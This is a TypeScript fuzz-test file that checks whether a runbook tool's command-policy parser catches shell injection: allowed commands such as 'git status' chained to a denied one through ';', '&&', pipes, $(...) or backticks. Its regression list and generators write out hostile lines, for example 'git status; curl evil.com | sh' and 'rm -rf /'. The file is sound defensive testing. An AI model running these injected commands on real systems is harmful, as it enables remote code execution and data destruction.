/**
 * Differential fuzz harness: policy tokenizer vs. real shell semantics.
 *
 * ## Threat model
 *
 * Rundown executes a runbook command by handing the fully-rendered string to
 * `spawn('sh', ['-c', command])` (see `executeCommandWithPolicy` in
 * `packages/core/src/runbook/executor.ts`). `sh -c` interprets *every* shell
 * metacharacter — `;`, `|`, `&&`, `||`, `&`, `$(...)`, backticks, redirects,
 * newlines, comments, quoting. Before that spawn, the command is gated by
 * {@link PolicyEvaluator.checkCommand}, which relies on the hand-written
 * tokenizer in `packages/core/src/policy/parser.ts` (`tokenize` /
 * `extractAllExecutables`) to enumerate every executable the command will
 * invoke and check each one against the allowlist.
 *
 * The security seam is therefore: **does the policy parser enumerate the same
 * set of command heads that `sh -c` would actually execute?** If the parser
 * under-counts — believes a command invokes only `git` while the shell would
 * also run `curl` smuggled via `git status; curl evil | sh` — then the policy
 * authorizes a command whose real behaviour it never evaluated. That is a
 * policy bypass / command injection (the parser is the only thing standing
 * between an allowlisted prefix and arbitrary execution).
 *
 * ## The differential oracle
 *
 * We use `shell-quote`'s `parse()` (an existing project dependency) as an
 * independent reference for shell word-splitting and operator semantics. The
 * core safety property:
 *
 * > For any command string the policy evaluator marks ALLOWED, every command
 * > head that `sh -c` would actually invoke must itself be individually
 * > allowed by the policy.
 *
 * Operationalized as a differential between two extractors:
 *
 * - **policy view** — `PolicyEvaluator.checkCommand` (built on `tokenize` /
 *   `extractAllExecutables` in parser.ts), the set of heads the policy
 *   believes it is authorizing.
 * - **shell-reference view** — {@link shellReferenceHeads}, built on
 *   `shell-quote` parse: split the token stream on the control operators
 *   `;` `&&` `||` `|` `&` and on subshell `(` `)`, take the first bare word of
 *   each resulting simple command as a command head, and recurse into command
 *   substitutions `$(...)` / backticks (which the shell also executes).
 *
 * A counterexample is any input where the policy verdict is "allowed" yet the
 * shell-reference view reveals a command head that is NOT in the allowed set —
 * i.e. the shell would run a program the policy never authorized.
 *
 * ## Conventions
 *
 * fast-check (property arbitraries) + jest, matching
 * `parser.properties.test.ts`. The allow set is intentionally tiny (`git`,
 * `echo`) with `mode: 'deny'`, so any smuggled head (`curl`, `rm`, `sh`, ...)
 * is denied unless the policy parser explicitly enumerated and the evaluator
 * approved it.
 *
 * @module
 */

import fc from 'fast-check';
import { parse as shellQuoteParse, type ParseEntry } from 'shell-quote';
import { PolicyEvaluator } from '../../src/policy/evaluator.js';
import { DEFAULT_POLICY, type PolicyConfig } from '../../src/policy/schema.js';
import { getErrorMessage } from '../../src/index.js';

const repoRoot = '/test/repo';

/** Executables the harness policy will allow. Everything else is denied. */
const ALLOWED = ['git', 'echo'] as const;

/** Shell-builtin / non-program words that the reference must not treat as a
 * smuggled external executable: they never resolve to a separate program a
 * policy would gate. Keeping this list small keeps the oracle conservative —
 * a word omitted here is treated as a real head, biasing toward MORE
 * divergence reports, not fewer. */
const SHELL_NONHEADS = new Set<string>([
  // Intentionally empty: kept as a documented seam. Adding a word here would
  // suppress it as a head and weaken the oracle, so it stays empty unless a
  // word is proven to never resolve to a gated program.
]);

/**
 * Build a deny-mode policy whose run allowlist is exactly the given names.
 *
 * @param allow - Executable names to allow (exact glob entries)
 * @returns A policy config with `mode: 'deny'` and the given run allowlist
 */
const denyRunPolicy = (allow: readonly string[]): PolicyConfig => ({
  ...DEFAULT_POLICY,
  default: {
    ...DEFAULT_POLICY.default,
    mode: 'deny',
    run: { allow: [...allow], deny: [] },
  },
});

/**
 * Reduce a `file/path/name` word to its basename, mirroring the policy
 * parser's `path.basename` normalization so the two views compare like-for-like.
 *
 * @param word - A raw command-head word from the shell parse
 * @returns The basename component of the word
 */
function basename(word: string): string {
  const idx = word.lastIndexOf('/');
  return idx >= 0 ? word.slice(idx + 1) : word;
}

/** Operators that terminate a simple command (start a new command head). */
const COMMAND_SEPARATORS = new Set(['&&', '||', '|', ';', '&', '\n', '(', ')']);

/** Matches a leading `KEY=VALUE` environment assignment (same shape as the
 * policy parser's `isEnvAssignment`). */
const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Extract the set of command heads that `sh -c` would actually invoke,
 * using `shell-quote` as an independent shell-semantics reference.
 *
 * Walks the `shell-quote` token stream, treating control operators
 * (`;`, `&&`, `||`, `|`, `&`) and subshell parentheses as command boundaries.
 * The first bare-string word after a boundary (skipping leading `KEY=VALUE`
 * assignments) is a command head. Glob/`op` tokens that `shell-quote` emits
 * for unresolved substitutions are handled separately: literal `$(...)` and
 * backtick spans in the *raw* string are recursively descended, because the
 * shell executes those inner commands too.
 *
 * Conservative by construction: when `shell-quote` cannot fully resolve a
 * word (returns an object token such as `{ op: 'glob' }`), the position is
 * skipped rather than guessed. This biases the oracle toward NOT inventing
 * phantom heads, so a reported divergence reflects a head the reference is
 * confident the shell would run.
 *
 * @param command - The raw shell command string
 * @returns The set of command-head basenames the shell would invoke
 */
function shellReferenceHeads(command: string): Set<string> {
  const heads = new Set<string>();

  // 1. Recurse into command substitutions $(...) and `...` in the raw string.
  //    The shell executes the inner command; its head must also be authorized.
  for (const inner of extractSubstitutionBodies(command)) {
    for (const h of shellReferenceHeads(inner)) heads.add(h);
  }

  // 2. Tokenize with shell-quote and split into simple commands.
  let tokens: ParseEntry[];
  try {
    tokens = shellQuoteParse(command);
  } catch {
    // If even the reference parser cannot tokenize, we cannot make a claim
    // about this input; return what substitution recursion already found.
    return heads;
  }

  let atHead = true; // expecting a command head at the next bare word
  let skippingAssignments = true; // leading KEY=VALUE words precede the head

  for (const tok of tokens) {
    if (typeof tok !== 'string') {
      // Operator / comment / glob object token.
      if ('op' in tok && COMMAND_SEPARATORS.has(tok.op)) {
        atHead = true;
        skippingAssignments = true;
      }
      // `{ comment }` ends the line content; a following op would reset us.
      // Unresolved glob/substitution object tokens in head position make the
      // head unknowable — conservatively stop expecting a head here.
      else if ('op' in tok) {
        // e.g. the '(' / ')' from a bare $(...) that survived step 1, or globs.
        if (COMMAND_SEPARATORS.has(tok.op)) atHead = true;
      }
      continue;
    }

    if (!atHead) continue;

    // We are at a candidate command head.
    if (skippingAssignments && ENV_ASSIGNMENT.test(tok)) {
      continue; // leading assignment, keep scanning for the real head
    }

    const head = basename(tok);
    if (head.length > 0 && !SHELL_NONHEADS.has(head)) {
      heads.add(head);
    }
    atHead = false;
    skippingAssignments = false;
  }

  return heads;
}

/**
 * Extract the raw bodies of top-level `$(...)` and backtick command
 * substitutions from a command string, so the differential reference can
 * recurse into the commands the shell would run inside them.
 *
 * Uses balanced-paren / quote-aware scanning that mirrors the spirit of the
 * policy parser's `scanSubst` / `scanBacktick`, kept deliberately independent
 * so a shared bug cannot hide a divergence.
 *
 * @param command - The raw shell command string
 * @returns The inner text of each top-level command substitution
 */
function extractSubstitutionBodies(command: string): string[] {
  const bodies: string[] = [];
  let i = 0;
  let quote: "'" | '"' | null = null;

  while (i < command.length) {
    const ch = command[i];

    if (quote === "'") {
      if (ch === "'") quote = null;
      i++;
      continue;
    }
    if (quote === '"') {
      // $(...) and backticks are still active inside double quotes.
      if (ch === '"') {
        quote = null;
        i++;
        continue;
      }
      if (ch !== '$' && ch !== '`') {
        i++;
        continue;
      }
      // fall through to substitution handling below
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      i++;
      continue;
    }

    if (ch === '$' && command[i + 1] === '(') {
      const end = scanParens(command, i + 2);
      if (end >= 0) {
        bodies.push(command.slice(i + 2, end - 1));
        i = end;
        continue;
      }
    }
    if (ch === '`') {
      const end = command.indexOf('`', i + 1);
      if (end >= 0) {
        bodies.push(command.slice(i + 1, end));
        i = end + 1;
        continue;
      }
    }
    i++;
  }

  return bodies;
}

/**
 * Scan forward from just inside a `$(` to the matching `)`, balancing nested
 * parentheses and ignoring single-quoted spans.
 *
 * @param s - The full command string
 * @param start - Index immediately after the opening `(`
 * @returns Index just past the matching `)`, or -1 if unbalanced
 */
function scanParens(s: string, start: number): number {
  let level = 1;
  let i = start;
  let quote: "'" | '"' | null = null;
  while (i < s.length) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) quote = null;
      i++;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    else if (ch === '(') level++;
    else if (ch === ')') {
      level--;
      if (level === 0) return i + 1;
    }
    i++;
  }
  return -1;
}

// ---------------------------------------------------------------------------
// Adversarial command arbitrary
// ---------------------------------------------------------------------------

/** An allowed-looking command head plus benign args. */
const allowedSimpleArb = fc.constantFrom('git status', 'echo hi', 'git log', 'echo {{x}}');

/** A denied executable the attacker wants to smuggle past the policy. */
const deniedHeadArb = fc.constantFrom('curl', 'rm', 'wget', 'nc', 'python', 'sh', 'bash');

/** A denied simple command (head + a token), e.g. `curl evil.com`. */
const deniedSimpleArb = fc
  .record({ head: deniedHeadArb, arg: fc.constantFrom('evil.com', '-rf /', 'x', 'a/b') })
  .map(({ head, arg }) => `${head} ${arg}`);

/** Shell control operators that compose two commands into one line. */
const operatorArb = fc.constantFrom(' ; ', ' && ', ' || ', ' | ', ' & ', '\n', '; ', ';');

/** Wrap a denied command in a shell construct that hides it from a naive parser. */
const smuggleArb = (denied: fc.Arbitrary<string>): fc.Arbitrary<string> =>
  fc.oneof(
    denied, // bare
    denied.map((c) => `$(${c})`), // $() substitution
    denied.map((c) => `\`${c}\``), // backtick substitution
    denied.map((c) => `"$(${c})"`), // quoted substitution
    denied.map((c) => `(${c})`), // subshell
    denied.map((c) => `{ ${c}; }`), // brace group
    denied.map((c) => `\\\n${c}`), // line-continuation prefix
    denied.map((c) => `#x\n${c}`), // comment then newline then command
  );

/**
 * Decorate an allowed command with a shell construct that places a denied head
 * in a position the shell does NOT execute as a command (argument, redirect
 * target, comment, quoted text, parameter-expansion default). These are the
 * payloads most likely to make the policy parser AND the shell agree on "only
 * the allowed head runs" — and therefore the inputs that actually exercise the
 * invariant (the policy says allowed, so the oracle must verify the shell
 * agrees). A divergence here would mean the parser thinks the denied word is
 * inert while the shell would run it (or vice versa).
 *
 * The generator deliberately produces commands the policy is *likely* to allow,
 * unlike {@link smuggleArb} which produces commands it should deny. Both classes
 * are needed: the deny class proves obvious injections are caught; the allow
 * class proves the parser's "this token is not a command" judgements match the
 * shell's.
 */
const allowedDecoratedArb: fc.Arbitrary<string> = fc
  .record({
    a: allowedSimpleArb,
    denied: deniedHeadArb,
    kind: fc.constantFrom<
      | 'arg'
      | 'comment'
      | 'singleQuoted'
      | 'doubleQuoted'
      | 'redirectTarget'
      | 'paramDefault'
      | 'lineContinuation'
      | 'escapedSemicolon'
      | 'escapedAmp'
      | 'fdRedirect'
      | 'tabSep'
      | 'arithmetic'
    >(
      'arg',
      'comment',
      'singleQuoted',
      'doubleQuoted',
      'redirectTarget',
      'paramDefault',
      'lineContinuation',
      'escapedSemicolon',
      'escapedAmp',
      'fdRedirect',
      'tabSep',
      'arithmetic',
    ),
  })
  .map(({ a, denied, kind }) => {
    switch (kind) {
      case 'arg':
        return `${a} ${denied}`; // denied is a plain argument, not a head
      case 'comment':
        return `${a} #${denied} evil`; // denied is inside a comment
      case 'singleQuoted':
        return `${a} '; ${denied} evil'`; // operators+head inert inside ' '
      case 'doubleQuoted':
        return `${a} "; ${denied} evil"`; // inert inside " " (no $/`)
      case 'redirectTarget':
        return `${a} > ${denied}`; // denied is a redirect FILE, not executed
      case 'paramDefault':
        return `${a} \${x:-${denied}}`; // denied is an expansion default value
      case 'lineContinuation':
        return `${a} \\\n${denied}`; // backslash-newline → one command
      case 'escapedSemicolon':
        return `${a} \\; ${denied}`; // escaped ; is a literal arg in sh
      case 'escapedAmp':
        return `${a} \\&\\& ${denied}`; // escaped && is literal args
      case 'fdRedirect':
        return `${a} 2>&1 ${denied}`; // fd dup; denied is an arg
      case 'tabSep':
        return `${a}\t${denied}`; // tab whitespace; denied is an arg
      case 'arithmetic':
        return `${a} $(( 1 + 1 )) ${denied}`; // arithmetic, not cmd subst
      default: {
        // Exhaustiveness guard: every `kind` is handled above.
        const _exhaustive: never = kind;
        return _exhaustive;
      }
    }
  });

/**
 * Build adversarial command strings spanning two complementary classes plus
 * free-form noise:
 *
 * 1. **smuggle class** — allowed prefix joined to a denied command via a shell
 *    operator/substitution. The policy SHOULD deny these; they pin that
 *    obvious injections are caught.
 * 2. **allowed-decorated class** — allowed command with a denied word placed in
 *    a non-command position. The policy SHOULD allow these; they actually
 *    exercise the differential invariant (allowed ⇒ shell agrees).
 * 3. **free-form** — random metacharacter soup to widen coverage beyond the
 *    templates.
 *
 * These are the payloads most likely to expose a divergence between the policy
 * tokenizer and `sh -c`.
 */
const adversarialCommandArb: fc.Arbitrary<string> = fc.oneof(
  // ---- allowed-decorated class (exercises the invariant) ----
  allowedDecoratedArb,
  allowedDecoratedArb,
  allowedDecoratedArb, // weight this class higher so the property is not vacuous
  // ---- smuggle class (pins obvious injections are denied) ----
  // allowed OP smuggled-denied
  fc
    .record({ a: allowedSimpleArb, op: operatorArb, d: smuggleArb(deniedSimpleArb) })
    .map(({ a, op, d }) => `${a}${op}${d}`),
  // smuggled-denied OP allowed (denied first)
  fc
    .record({ d: smuggleArb(deniedSimpleArb), op: operatorArb, a: allowedSimpleArb })
    .map(({ d, op, a }) => `${d}${op}${a}`),
  // allowed with denied hidden in an argument substitution: echo $(curl evil)
  fc.record({ a: allowedSimpleArb, d: deniedSimpleArb }).map(({ a, d }) => `${a} $(${d})`),
  // three-way chains
  fc
    .record({
      a: allowedSimpleArb,
      op1: operatorArb,
      d: deniedSimpleArb,
      op2: operatorArb,
      a2: allowedSimpleArb,
    })
    .map(({ a, op1, d, op2, a2 }) => `${a}${op1}${d}${op2}${a2}`),
  // heredoc framing around a smuggled command
  fc
    .record({ a: allowedSimpleArb, d: deniedSimpleArb })
    .map(({ a, d }) => `${a} <<EOF\nbody\nEOF\n${d}`),
  // ---- free-form ----
  fc.stringMatching(/^[a-z;&|()$`{}<> \n#'"\\=/-]{0,40}$/).filter((s) => s.trim().length > 0),
);

// ---------------------------------------------------------------------------
// The differential property
// ---------------------------------------------------------------------------

/** Outcome of running the differential oracle on one command. */
interface OracleResult {
  /** Whether the policy evaluator allowed the command. */
  policyAllowed: boolean;
  /** The divergence (bypass) details, or `null` if the invariant held. */
  divergence: {
    command: string;
    policyAllowed: boolean;
    shellHeads: string[];
    unauthorized: string[];
  } | null;
}

/**
 * Run the differential oracle on a single command string.
 *
 * @param command - The candidate command
 * @returns The policy verdict and any divergence found
 * @throws If {@link PolicyEvaluator.checkCommand} throws on the input
 */
function runOracle(command: string): OracleResult {
  const evaluator = new PolicyEvaluator(denyRunPolicy(ALLOWED), { repoRoot });

  let decision: ReturnType<PolicyEvaluator['checkCommand']>;
  try {
    decision = evaluator.checkCommand(command);
  } catch (err) {
    // A throw from the policy evaluator on attacker input is itself a problem,
    // but out of scope for the bypass oracle; surface it loudly.
    throw new Error(`checkCommand threw on ${JSON.stringify(command)}: ${getErrorMessage(err)}`);
  }

  if (!decision.allowed) {
    return { policyAllowed: false, divergence: null }; // denied — no bypass possible
  }

  const allowedSet = new Set<string>(ALLOWED);
  const shellHeads = shellReferenceHeads(command);
  const unauthorized = [...shellHeads].filter((h) => !allowedSet.has(h));

  if (unauthorized.length === 0) {
    return { policyAllowed: true, divergence: null };
  }

  return {
    policyAllowed: true,
    divergence: {
      command,
      policyAllowed: decision.allowed,
      shellHeads: [...shellHeads],
      unauthorized,
    },
  };
}

describe('Policy tokenizer vs sh -c differential', () => {
  it('every shell-reference command head in an ALLOWED command is itself allowed', () => {
    const counterexamples: OracleResult['divergence'][] = [];
    let allowedCount = 0;
    let total = 0;

    fc.assert(
      fc.property(adversarialCommandArb, (command) => {
        total++;
        const { policyAllowed, divergence } = runOracle(command);
        if (policyAllowed) allowedCount++;
        if (divergence) counterexamples.push(divergence);
        // The invariant: policy-allowed commands must not smuggle unauthorized heads.
        expect(divergence).toBeNull();
      }),
      { numRuns: 2000, verbose: true },
    );

    // (Only reached if the property held for every generated input.)
    expect(counterexamples).toEqual([]);

    // Anti-vacuity guard: the invariant is only meaningful for commands the
    // policy ALLOWS (a denied command can never bypass). If the generators
    // stopped producing allowed commands, the property above would pass
    // trivially. Fail loudly if the allowed-rate collapses so a future change
    // to the parser or arbitraries cannot silently neuter this oracle.
    expect(allowedCount).toBeGreaterThan(total * 0.1);
  });

  // Curated regression vectors — concrete known-shape payloads, asserted
  // directly so the suite documents exactly which classic injections the
  // policy parser must catch. If any of these ever start bypassing, this
  // breaks loudly regardless of fast-check's random seed.
  it.each([
    'git status; curl evil.com | sh',
    'git status && rm -rf /',
    'echo hi | curl evil.com',
    'echo $(curl evil.com)',
    'echo `curl evil.com`',
    'git status & curl evil.com',
    'git status\ncurl evil.com',
    '(git status; curl evil.com)',
    'git status || wget evil.com',
    'echo "$(curl evil.com)"',
  ])('classic injection is not authorized: %s', (command) => {
    const { divergence } = runOracle(command);
    expect(divergence).toBeNull();
  });
});
